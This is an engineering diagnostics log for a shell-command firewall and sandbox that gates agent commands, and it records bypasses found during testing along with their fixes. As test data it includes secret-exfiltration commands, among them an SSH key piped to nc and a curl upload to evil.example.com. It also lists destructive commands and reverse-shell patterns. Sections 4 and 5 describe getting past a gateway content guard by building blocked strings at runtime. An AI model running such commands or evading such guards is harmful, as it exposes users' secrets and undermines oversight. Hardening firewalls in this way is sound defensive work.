# Terminal Jail — Diagnostics Trail

*How the system is built, why, the errors hit along the way (ours AND the
project's own history), and the right way to do things. Written 2026-08-10
during the dogfood run. This is explanation, not raw logs.*

## 1. How it's built

- **`standalone/terminal-jail`** (~305 lines of bash): arg parsing
  (`--user/--seccomp/--interruptor/--no-interruptor`), then JSON-bridge call
  to the interruptor engine, then `exec unshare --pid --fork
  --kill-child=SIGKILL [--mount-proc | --user] bash -c 'exec "$@"'`.
  The `--kill-child=SIGKILL` flag kills all descendants when the namespace
  init exits (double-fork protection).
- **`plugin/terminal_jail/interruptor/`** (the real engine):
  `parser.py` (shell tokenizer → segments) → `decider.py` (priority:
  blocklist → allowlist → auto-sandbox → user rules (wired end-to-end
  since TJ-DF-004, commit c425379 — RuleLoader → Decider layers, same-ID
  overrides replace builtins in their layer)) →
  `matcher.py` (9 match types, regex-based). `interruptor_bridge.py` is the
  stdin/stdout JSON wrapper the CLI talks to.
- **`plugin/terminal_jail/seccomp.py`**: hand-built BPF (stdlib ctypes only,
  no libseccomp), default-allow with explicit denials (mount, pivot_root,
  kexec_load, ...), single-arch x86_64/aarch64. Applied via
  `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)`.
- **`plugin/__init__.py`**: Hermes plugin — registers `pre_tool_call`
  (observer/logs only) and `transform_terminal_output` (returns None).
- **`install.sh`**: local-checkout mode ships wrapper + plugin tree +
  seccomp loader to `~/.local/bin` + `~/.local/lib/terminal-jail/`.
- **systemd layer**: `systemd/90-terminal-jail-hardening.conf` — 4 ACTIVE
  directives (`ProtectProc=invisible`, `NoNewPrivileges=true`,
  `ProtectControlGroups=true`, `TasksMax=256`); `PrivateUsers`/
  `RestrictNamespaces`/fs-hardening commented out pending per-host
  verification (this was a P0 spec-vs-reality battle — PM-GAP-001,
  TJ-GAP-008/014/017/018/020 — and the docs now honestly say "lightweight").

## 2. Errors hit during the dogfood run, and what they meant

| Error | Meaning | Right way |
|---|---|---|
| `unshare: unshare failed: Operation not permitted` (rc=1) | host denies unprivileged PID namespaces (this host, Ubuntu 26.04/kernel 7.0.0-28) | documented; use `--user` |
| `ModuleNotFoundError: No module named 'terminal_jail'` from seccomp-loader (installed binary) | loader computes plugin dir as `dirname(dirname(loader))/plugin` = `<prefix>/lib/plugin`, but install.sh ships `<prefix>/lib/terminal-jail/plugin` | loader should walk up from its own file until it finds the package; installed-layout regression test needed (TJ-DF-002) |
| `prctl(PR_SET_SECCOMP) refused the filter: Permission denied (missing CAP_SYS_ADMIN or no_new_privs set?)` | seccomp without `no_new_privs` requires CAP_SYS_ADMIN in the INIT user namespace — never true for unprivileged users | call `prctl(PR_SET_NO_NEW_PRIVS, 1)` first; verified working unprivileged on this host (TJ-DF-003) |
| `COMMAND BLOCKED — interruptor-bridge-unavailable` (rc=126) | bridge not found / crashed → enforce mode fails closed | this is the CORRECT behavior (TJ-GAP-021 fix); `TERMINAL_JAIL_BRIDGE` overrides search |
| `fdisk: cannot open /dev/sda: Permission denied` inside `--user` jail | running as nobody=65534 — privilege drop working as intended | expected |
| `pip install -e .` OK but `import terminal_jail` → ModuleNotFoundError | setuptools find exposes `plugin` (include=`plugin*`), not `terminal_jail` | packaging fix (TJ-DF-006) |
| `terminal-jail: command blocked (builtin-fdisk): ...` rc=126 from `terminal-jail-sh` | shim path working from repo root (TJ-GAP-009 fix) | expected |

## 3. How the project got here (history lessons)

- **v1.0 → v1.1.0**: the plugin used to WRAP commands
  (`transform_command`/`transform_exec_command`). Hermes core has no
  pre-execution transform hook (HOOK-GAP-03), so those functions were dead
  code — removed in TJ-GAP-010 (v1.1.x). The plugin is observability-only
  TODAY; don't try to add command transformation to it, it can't be wired.
- **The interruptor was the pivot**: with the plugin unable to wrap, the
  firewall moved into the CLI as a bash↔python JSON bridge. The bridge
  protocol is the integration point to build on.
- **Quoting bypass (TJ-GAP-005)**: blocklist regexes were bypassed by
  wrapper-quoted argv (`'rm' '-rf' '/'`); fixed with quote-stripping
  normalization in the matcher. The CURRENT bypass class is different:
  flag-order variants of the same command (TJ-DF-001) and the fact that
  regex rules can't see argv structure. Lesson: pattern firewalls need
  token-level (argv) rules, not string regexes, for security-critical
  patterns.
- **BUG-001**: seccomp arch-check BPF jump offsets were inverted (jt/jf are
  relative-to-next), killing every wrapped command with SIGSYS — fixed and
  regressed. Lesson: BPF hand-rolled with ctypes needs live probes; the
  pentest plan (docs/pentest-plan.md PT-004) is the right venue.
- **Premature completion pattern (recurring)**: T11.2 "Rule loader" marked
  complete while the decider never calls it (TJ-DF-004); E2E-001-GAP-01 fixed
  specs but missed README's rule table (TJ-DF-005); TJ-GAP-021 fixed
  missing-bridge fail-open but engine errors still fail open through the
  bridge's `_emit_fail_open` → enforce mode silently runs unfiltered if
  `intercept()` ever raises. The bridge's fail-open design is documented,
  but the CLI never checks `reason` for `[bridge-error]` in enforce mode —
  worth a follow-up probe when user rules (TJ-DF-004) land, since that adds
  a new failure surface.

## 4. Errors hit during the 2026-08-19 dogfood run

| Error / observation | Meaning | Right way |
|---|---|---|
| `chmod -R 777 /` → ALLOW (bridge + CLI rc=0) | builtin-chmod-777-root pattern `chmod\s+777\s+/` can't cross a flag token — recursive/`a+rwx`/`7777` variants all bypass; same bug class TJ-DF-001 fixed for rm but never applied to chmod | token-aware order-independent pattern + regression tests (TJ-DF-011, P0) |
| same-ID user rule `action: warn` → `rm -rf /` runs with NO warning | `_rule_result()` has no Action.WARN branch (falls into "unknown action — allow (fail-safe)") AND `evaluate()`'s segment loop drops the reason — CLI prints nothing | explicit WARN handling + surface reason on stderr, matching env-mode warn (TJ-DF-012, P1) |
| `--user` jail shows `USER=kara`, `HOME=<caller home>` | env vars are inherited; only uid changes to 65534 | scrub USER/LOGNAME/HOME on privilege drop or document pass-through (TJ-DF-014, P3) — FIXED 2026-08-19, re-verified 2026-09-15 |
| `terminal-jail --user python3` READS mode-600 caller files and CREATES files in caller HOME as owner (2026-09-15) | `unshare --user` launched with NO uid mapping: uid *displays* overflow to 65534 but credentials keep the caller's underlying kuid, so file DAC still evaluates as OWNER. Control test (`sudo -u nobody`, same file) → errno 13 | real uid mapping (`--map-auto`/newuidmap+subuid) or loud docs that `--user` = PID containment + env scrub ONLY (TJ-DF-015, P0) |
| warn mode on an EPERM host exits 2 with NO warning line | namespace preflight death precedes firewall warning output — the "warn = warns, allows" contract only covers the firewall layer | evaluate firewall before preflight; print verdict lines regardless of namespace outcome (TJ-DF-016, P1) |
| `--user echo` as the quickstart verify step "passes" on EPERM hosts | it proves exec+rc=0 only — zero containment properties verified; `id`/`/proc/status` showing 65534 inside the jail further corroborates the wrong belief | run `scripts/pidns-capability-probe.py` FIRST, branch verify on FULL/DEGRADED, and verify isolation claims with a control test (real nobody) not the jail's own self-report (TJ-DF-017, P2) |
| skills/terminal-jail-usage/SKILL.md lists TJ-DF-001..008 as open; diagnostics §1 said "user rules: NOT IMPLEMENTED" | knowledge artifacts weren't refreshed when fixes landed (TJ-DF-013) | refresh skill + diagnostics when a gap closes; skill should point at the board for current state |
| Hermes gateway hardline blocked probe commands containing literal `mkfs`/`dd of=/dev/...` strings even as bridge data | host-gateway content guard, not a terminal-jail defect; TJ-GAP-035 fix for the wrapper itself verified working | build dangerous-command strings at runtime in scratch probe files |

## 5. Errors hit during the 2026-09-17 dogfood run

| Error / observation | Meaning | Right way |
|---|---|---|
| `terminal-jail bash script.sh` → "Modified: … sandboxed" then rc=2 "namespace creation failed" | The bridge chose the legacy user-ns prefix (flags that DO work via `--user`) but the wrapper's bare-mode preflight (standalone/terminal-jail:366) exits 2 BEFORE the already-prefixed branch at :386 — ordering bug, not a namespace failure. All 8 auto-sandbox classes dead on DEGRADED hosts | skip/re-branch the bare preflight when the incoming command already carries a bridge prefix; add a DEGRADED-host end-to-end modify regression (DF-TERMINAL-JAIL-11, P1) — **RESOLVED 2026-09-19** (commit `fix(interruptor): repair degraded auto-sandbox modify path`): when a bridge rewrite is present the wrapper probes the REWRITE'S own prefix flags (`unshare <flags> true`) instead of its bare-mode launch, so the rewrite runs and the inner exit code propagates; a rewrite whose own prefix cannot be created exits 2 with `auto-sandbox modify unavailable` naming the flags probed (never the generic namespace message). Bare mode for non-rewritten commands is unchanged. Regression: `plugin/test_modify_preflight.py` (6 cases, 5 fail pre-fix). |
| `cat /etc/passwd` → allow with rule_id null, reason empty; `ls`, `pwd`, `git status` → also rule_id null | Two things at once: (1) the firewall is deny-list-over-default-allow and NO doc states that; (2) allowlist matches and no-match are indistinguishable in the verdict — an audit consumer can't tell an explicit allow from an unexamined one | emit rule_id on allowlist hits + one prominent paragraph in README/quickstart/specs: "unmatched = ALLOWED" (DF-TERMINAL-JAIL-12, P1) |
| `allow-cat-safe` never matches sensitive paths despite its "non-sensitive paths" description | The lookahead `(?!.*/(etc|boot|proc|sys))` contains `.*` which matches empty — ANY path under those prefixes fails it, so the rule silently no-ops exactly where its description claims it discriminates; `cat /etc/passwd` rides default-allow instead | anchor the lookahead to the token boundary: `^cat\s+(?!/(etc|boot|proc|sys)(/|\s|$))`; regression-assert the matched rule for `cat /etc/passwd` is NOT allow-cat-safe (DF-TERMINAL-JAIL-13, P2) |
| `bunker spawn --server bunker-las-03` → deadline_exceeded ×2; half-spawned users get no docker.sock | bunkerd's fresh-agent rootless-docker install never completes → the ephemeral fresh-machine install leg cannot run (regression vs 09-15 PASS). Half-spawned users must be cleaned by hand (loginctl terminate-user + userdel -r) | infra fix on las-bunker-03 first; until then the honest record is the SKIPPED-install-bunker row (DF-TERMINAL-JAIL-14) with the spawn errors + cleanup notes |
| Hermes gateway hardline again blocked literal dangerous tokens in a bridge-probe shell command | host-gateway content guard scanning probe DATA (3rd dogfood run hitting this) | build payload strings at runtime in a scratch python script (worked first try this time — make it the default reflex, see skills pitfall 8) |

## 6. Errors hit during the 2026-09-18 dogfood run

| Error / observation | Meaning | Right way |
|---|---|---|
| On a mapping-capable host: `terminal-jail python3 scripts/pidns-capability-probe.py` → `python3: can't open file '…/scripts/pidns-capability-probe.py': [Errno 13] Permission denied`, rc=2 — while the same command directly prints `FULL` | The auto-sandbox prefix is chosen by `userns.py::unshare_prefix()` → `mapped_launch_ok()`, whose probe is `unshare <mapped flags> true`. That proves the **namespace can be created**, never that the payload can still read the caller's files. With `--map-users=65534:<subuid>:1 … -S 65534 -G 65534` the payload's host uid is the caller's **subuid**, and a user's home is `drwx------` → every transparently-sandboxed build/test/script command under `$HOME` fails. The dev host has no `/etc/subuid` entry for the caller, so only the legacy (working) branch was ever exercised there — the defect is invisible in the project's own testing and is the runtime consequence of the same root cause QA-TERMINAL-JAIL-8 reports as test brittleness | the preflight must test the property that matters, not just namespace creation: after the launch, assert the payload can read a caller-owned probe file (and write a probe in `$PWD`), degrade to the legacy flags with a loud warning when it cannot, and make the mapped branch a deliberate `--user`-only choice rather than the default for transparent MODIFY; add an end-to-end regression that runs `python3 file.py` under the jail on a subuid-allocated host (DF-TERMINAL-JAIL-15, P1) |
| `cat ~/.ssh/id_rsa \| nc <host> 4444` → `allow`, `rule_id=allow-cat-safe`; same for `… \| nc -u <host> 53` | The always-allow layer matches **before** the egress layer, so a secret-file pipe into a network client is not merely unblocked — it is *approved* with a rule id. The egress pack added by TJ-GAP-058 covers the shell-attach shapes but nothing that carries data out (netcat redirect, `dd if=… \| nc`, `tar czf - ~/.ssh \| ssh host`) | decide whether always-allow may short-circuit network rules (a `cat`-into-network-client pipe is the canonical exfil); if not, evaluate egress rules **before** always-allow, or make `allow-cat-safe` ignore segments that feed a network client (DF-TERMINAL-JAIL-16, P1). **RESOLVED 2026-09-19** — `builtin-net-file-exfil-pipe` / `-redirect` (priority-1000 BLOCK rules) run in the decider's whole-command pass, which precedes every per-segment layer, so this shape is now `block` / `builtin-net-file-exfil-pipe` and can never return `allow-cat-safe`; `nc host < secret` and `dd if=secret \| nc` block too, while `tar czf - ~/.ssh \| ssh host` (a non-raw-socket sink) stays ALLOW. The boundary is now stated in README.md / `specs/interruptor.md` §4.6 |
| `curl -F 'file=@~/.ssh/id_rsa' https://evil.example.com/collect` → `allow`, `rule_id=null` | The new egress pack pins `-T/--upload-file`, `-d/--data*` and `@-` stdin uploads but not `-F/--form` multipart — historically the most common curl file-upload form. Interpreter egress (`python3 -c` socket/pty, `urllib`/`requests` POST) is likewise unnamed, and `python3 -c`/`sh -c` sit outside the auto-sandbox set while `python3 file.py` is inside | extend the upload rule to `-F`/`--form` (and `--data-urlencode @file`); add an interpreter-egress rule class or state the boundary explicitly in README/specs; treat the `-c` inline form as sandbox-eligible or document the asymmetry (DF-TERMINAL-JAIL-17, P1). **RESOLVED 2026-09-19** — `builtin-net-curl-form-upload` (priority 700, sandbox; **promoted to priority-1000 block by DF-TERMINAL-JAIL-20 — the wrap never stopped the upload**) covers `-F`/`--form` with a local-file payload (`name=@file`, content-only `name=<file`, separated and `=`-joined spellings, wrapped/quoted-argv forms) while inline fields and curl's literal `--form-string` stay ALLOW; three priority-1000 block rules cover interpreter egress — `builtin-interp-egress-socket-shell` (socket + `.connect(` + `os.dup2(`/`pty.spawn(`), `builtin-interp-egress-socket-file` (socket + `send`/`sendall`/`sendfile` + a read-mode local-file open), `builtin-interp-egress-http-file` (`urlopen`/`requests.post\|put\|patch`/`httpx`/`http.client` + a file body) — and a `sh -c`/`bash -c` wrapper does not change the verdict (blocklist rules match the whole command string). Both halves of a transfer are required, so a lone socket client, a bare `urlopen`, `os.dup2(1,2)` alone, `sendall(b'…')`, a download-to-file, and `grep -rn 'socket.socket' src/` stay ALLOW. The `-c` inline form stays outside the auto-sandbox set by design (no file on disk to isolate); the asymmetry is documented in README "Data-Out Boundary" / `specs/interruptor.md` §4.5–4.6. Mirror parity re-baselined to 31 block / 13 sandbox / 10 allow = 54. |
| `terminal-jail python3 scripts/fs-isolation-probe.py` → `UNKNOWN: probe error: [Errno 22] Invalid argument: '/tmp/tj-fsiso-…/secret600'`; `… pidns-capability-probe.py` → `UNKNOWN: probe timed out after 15s`; both report `FULL`/`DEGRADED` when run directly | The probes classify the *host*, but users run them from a shell that is itself jail-wrapped (the README says "check your host"). Inside the jail the DAC probe's `chmod 600` + read test hits errno 22 and the nested-`unshare` probe can't complete in 15 s; both then report `UNKNOWN`, which reads as a host property rather than "you are inside a jail" | detect the jail (e.g. `TERMINAL_JAIL_*` marker env or compare `/proc/self/ns/pid` with the host's) and print `UNKNOWN: running inside a terminal-jail namespace — re-run on the host`; raise the nested probe's timeout and name timeouts as environment artifacts (DF-TERMINAL-JAIL-18, P2) |
| `bunker spawn --server bunker-las-03` → `deadline_exceeded: context deadline exceeded` (2nd consecutive run; DF-14 was closed as complete) while the host is healthy: bunkerd active, load 0.05, `newuidmap` present, `/etc/subuid` ranges present, 13 leaked `bunker-*` users (uids 1001–1015) | The las-03 spawn path cannot produce an agent, and spawn failures leak users instead of cleaning up. Closing DF-14 without restoring the capability left the standard install leg broken while the board showed green | infra fix on bunker-las-03 (rootless-docker install step / deadline), a cleanup pass for the 13 orphaned users per `bunker-agent-isolation`, and re-open DF-14 if the capability is still absent; the install leg itself is satisfiable on bunker-las-02 (proved this run — clone 210 s, install <1 s, verify FULL/FULL, rc=126 block, bwrap private `/proc`) (DF-TERMINAL-JAIL-19, P2) |
| `curl -s -T /tmp/…/secret.txt http://127.0.0.1:18777/collect` → `modify` / `builtin-net-curl-upload`, CLI exit 0, and the collector received the file (132 bytes containing the secret) | The upload rules were priority-700 **auto-sandbox** rules, described as "staged exfil" coverage. The namespace wrap contains the filesystem view, not the socket: the rewrite does not restrict network access, so the rule neither stopped the upload nor could honestly claim to — the shape is *declared* exfil protection and *behaves* as a rewrite | decide the intent per rule and make it honest: prefer `block` for unambiguous local-file-to-network shapes, and if a shape stays `modify`, say plainly that the verdict is containment-neutral and does not prevent exfiltration (DF-TERMINAL-JAIL-20, P1). **RESOLVED 2026-09-19** — all four local-file egress rules (`builtin-net-curl-upload`, `-wget-post-file`, `-curl-form-upload`, `-remote-tree-copy`) are priority-1000 **BLOCK** rules in `blocklist.py` (35 block / 9 sandbox / 10 allow = 54), settled in the decider's whole-command pass before the allowlist and before any rewrite; the shipped mirror carries the same actions (gated per-rule by `scripts/yaml-mirror-parity-probe.py`), and `plugin/test_egress_no_delivery.py` proves end-to-end against a loopback collector that the same command now exits 126 and delivers nothing while a plain download and an inline-body API POST still run. **Upgrade note:** a host with a pre-DF-20 mirror in `~/.config/terminal-jail/rules.d/` keeps the old `sandbox` action for those ids (same-id override) — re-run `./install.sh`. |

## 7. The right way to extend this system

1. **Add a rule**: edit the engine's `blocklist.py`/`sandbox.py`/`allowlist.py`
   (builtins), or ship a user YAML rule to `~/.config/terminal-jail/rules.d/`
   (user rules ARE wired since TJ-DF-004 — verify with the bridge).
2. **Add a match type**: `matcher.py`, keep `match_segment` returning the
   matched rule id; add engine tests + a bridge-level probe.
3. **Test the firewall**: engine-level via `intercept()` (fast, no kernel
   deps) + bridge-level via stdin JSON (no execution) + CLI-level only for
   the block box/exit codes (execution on this host needs `--user`).
4. **Verify seccomp work**: `--user --seccomp` + a ctypes `mount()` probe
   must return EPERM (errno 1) — the filter denies with
   `SECCOMP_RET_ERRNO|EPERM`, it does NOT kill; check
   `/proc/self/status` → `Seccomp: 2` to confirm the filter is installed.
5. **Never** trust README's rule tables without grepping the engine —
   they drifted twice already (TJ-DF-005, E2E-001-GAP-01).
